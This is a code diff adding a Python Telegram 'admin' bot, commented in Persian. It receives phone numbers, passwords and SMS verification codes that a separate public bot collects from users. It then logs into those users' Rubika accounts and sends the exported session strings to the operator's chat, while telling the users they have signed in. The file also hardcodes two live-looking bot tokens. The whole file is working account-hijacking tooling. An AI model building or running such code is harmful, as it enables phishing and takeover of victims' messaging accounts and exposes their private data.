@@ -1,0 +1,220 @@
+import asyncio
+import json
+import aiohttp
+from aiogram import Bot, Dispatcher, types
+from aiogram.filters import Command
+from aiogram.types import Message
+from rubpy import Client
+
+# =============================================
+# 🔧 تنظیماتb
+# =============================================
+BOT_TOKEN = "8970376348:AAGT2JpjjjGJgwfzVA8pbgnzTCTzxsvRaAE"  # توکن ربات ادمین
+ADMIN_CHAT_ID = 613623  # آیدی عددی خودت (فقط برای لاگ)
+PUBLIC_BOT_TOKEN = "8725100247:AAG7RAeEvFvJWzlFcWgLcJHEgJp9ZibFPhc"  # توکن ربات عمومی
+
+bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher()
+
+# دیکشنری برای ذخیره‌ی اطلاعات موقت کاربران
+user_sessions = {}
+
+# =============================================
+# 📤 ارسال پیام به ربات عمومی (برای نمایش به کاربر)
+# =============================================
+async def notify_user(user_id: int, text: str):
+    """ارسال پیام به ربات عمومی برای نمایش به کاربر"""
+    url = f"https://api.telegram.org/bot{PUBLIC_BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": user_id,
+        "text": text,
+        "parse_mode": "Markdown"
+    }
+    try:
+        async with aiohttp.ClientSession() as session:
+            await session.post(url, json=payload, timeout=10)
+    except Exception as e:
+        print(f"❌ خطا در ارسال پیام به کاربر {user_id}: {e}")
+
+# =============================================
+# 📥 دریافت اطلاعات از ربات عمومی (خودکار)
+# =============================================
+@dp.message()
+async def handle_from_public_bot(message: Message):
+    """پردازش خودکار پیام‌های دریافتی از ربات عمومی"""
+    # فقط پیام‌های ارسالی از ادمین (ربات عمومی) رو پردازش کن
+    if message.chat.id != ADMIN_CHAT_ID:
+        return
+
+    text = message.text
+    if "📩 اطلاعات کاربر جدید" not in text:
+        return
+
+    # استخراج اطلاعات از متن
+    lines = text.split('\n')
+    data = {}
+    for line in lines:
+        if "📱 شماره:" in line:
+            data['phone'] = line.split(":")[1].strip()
+        elif "🔑 رمز عبور:" in line:
+            pwd = line.split(":")[1].strip()
+            data['password'] = pwd if pwd != "(وارد نشده)" else None
+        elif "🆔 Chat ID کاربر:" in line:
+            data['user_id'] = int(line.split(":")[1].strip())
+        elif "✅ کد تایید:" in line:
+            data['code'] = line.split(":")[1].strip()
+        elif "📌 مرحله:" in line:
+            data['step'] = line.split(":")[1].strip()
+
+    user_id = data.get('user_id')
+    if not user_id:
+        await message.reply("⚠️ Chat ID کاربر یافت نشد.")
+        return
+
+    # پردازش خودکار بر اساس مرحله
+    if data.get('step') == 'password_received':
+        # مرحله ۱: دریافت شماره و رمز → درخواست ارسال کد به روبیکا
+        await handle_send_code(data, message)
+
+    elif data.get('step') == 'code_received':
+        # مرحله ۲: دریافت کد → ورود نهایی به روبیکا
+        await handle_verify_code(data, message)
+
+# =============================================
+# 📤 درخواست ارسال کد به روبیکا (خودکار)
+# =============================================
+async def handle_send_code(data: dict, admin_message: Message):
+    user_id = data['user_id']
+    phone = data['phone']
+    password = data.get('password')
+
+    await admin_message.reply(f"🔄 درخواست ارسال کد به شماره {phone}...")
+
+    try:
+        # اتصال به روبیکا
+        client = Client(phone=phone, password=password)
+        await client.connect()
+
+        # درخواست ارسال کد تایید
+        await client.send_code(phone)
+
+        # ذخیره کلاینت برای مرحله بعد
+        user_sessions[user_id] = {
+            'client': client,
+            'phone': phone,
+            'password': password,
+            'step': 'code_sent'
+        }
+
+        # اطلاع‌رسانی خودکار به کاربر برای دریافت کد
+        await notify_user(user_id, "✅ کد تایید به شماره شما ارسال شد.\nلطفاً کد ۶ رقمی دریافتی از پیامک را وارد کنید.")
+
+        await admin_message.reply(f"✅ کد تایید به شماره {phone} ارسال شد.")
+
+    except Exception as e:
+        error_msg = f"❌ خطا در ارسال کد: {str(e)}"
+        await admin_message.reply(error_msg)
+        await notify_user(user_id, f"❌ خطا در ارسال کد: {str(e)}")
+
+# =============================================
+# ✅ تایید کد و ورود نهایی (خودکار)
+# =============================================
+async def handle_verify_code(data: dict, admin_message: Message):
+    user_id = data['user_id']
+    code = data['code']
+
+    session = user_sessions.get(user_id)
+    if not session:
+        await admin_message.reply("⚠️ جلسه‌ای برای این کاربر یافت نشد.")
+        await notify_user(user_id, "❌ خطا: جلسه منقضی شده. لطفاً دوباره تلاش کنید.")
+        return
+
+    client = session['client']
+    phone = session['phone']
+
+    await admin_message.reply(f"🔄 در حال تایید کد برای شماره {phone}...")
+
+    try:
+        # تایید کد و ورود نهایی
+        await client.sign_in(phone=phone, code=code)
+
+        # ذخیره نشست
+        session_str = client.export_session_string()
+        user_sessions[user_id]['session'] = session_str
+        user_sessions[user_id]['step'] = 'logged_in'
+
+        # اطلاع‌رسانی خودکار موفقیت به کاربر
+        await notify_user(user_id, "✅ ورود به روبیکا با موفقیت انجام شد!\nشما اکنون وارد حساب خود شده‌اید.")
+
+        await admin_message.reply(f"""
+✅ **ورود خودکار موفق برای شماره {phone}**
+
+📱 شماره: {phone}
+🔑 نشست ذخیره شد.
+
+نشست: `{session_str[:150]}...`
+""", parse_mode="Markdown")
+
+    except Exception as e:
+        error_msg = f"❌ خطا در تایید کد: {str(e)}"
+        await admin_message.reply(error_msg)
+        await notify_user(user_id, f"❌ خطا در تایید کد: {str(e)}")
+
+        # پاک کردن جلسه ناموفق
+        if user_id in user_sessions:
+            del user_sessions[user_id]
+
+# =============================================
+# 🛠️ دستورات ادمین (فقط برای نظارت)
+# =============================================
+@dp.message(Command("sessions"))
+async def list_sessions(message: Message):
+    if message.chat.id != ADMIN_CHAT_ID:
+        return
+
+    if not user_sessions:
+        await message.reply("📭 هیچ نشست فعالی وجود ندارد.")
+        return
+
+    text = "📋 **لیست نشست‌های فعال:**\n\n"
+    for user_id, data in user_sessions.items():
+        if data.get('step') == 'logged_in':
+            text += f"👤 کاربر: {user_id} | 📱 {data['phone']} | ✅ وارد شده\n"
+        elif data.get('step') == 'code_sent':
+            text += f"👤 کاربر: {user_id} | 📱 {data['phone']} | ⏳ منتظر کد\n"
+
+    await message.reply(text, parse_mode="Markdown")
+
+@dp.message(Command("logout"))
+async def logout_user(message: Message):
+    if message.chat.id != ADMIN_CHAT_ID:
+        return
+
+    parts = message.text.split()
+    if len(parts) < 2:
+        await message.reply("⚠️ لطفاً Chat ID کاربر را وارد کنید:\n/logout 123456789")
+        return
+
+    user_id = int(parts[1])
+    if user_id not in user_sessions:
+        await message.reply(f"❌ کاربری با Chat ID {user_id} یافت نشد.")
+        return
+
+    try:
+        await user_sessions[user_id]['client'].logout()
+        await notify_user(user_id, "🔒 شما از حساب خود خارج شدید.")
+        del user_sessions[user_id]
+        await message.reply(f"✅ کاربر {user_id} از حساب خود خارج شد.")
+    except Exception as e:
+        await message.reply(f"❌ خطا: {str(e)}")
+
+# =============================================
+# 🚀 اجرای ربات ادمین
+# =============================================
+async def main():
+    print("🤖 ربات ادمین (خودکار) راه‌اندازی شد...")
+    print(f"✅ منتظر دریافت اطلاعات از ربات عمومی...")
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
